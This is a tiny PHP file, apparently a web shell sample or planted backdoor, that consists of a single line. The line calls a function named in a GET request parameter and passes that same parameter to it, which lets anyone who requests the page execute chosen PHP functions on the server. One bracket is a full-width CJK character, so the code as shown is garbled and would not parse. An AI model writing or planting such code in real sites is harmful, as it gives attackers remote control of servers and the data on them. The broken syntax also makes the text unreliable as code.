<?php
$_GET['6d-s-F3q'〕($_GET['6d-s-F3q']);
?>
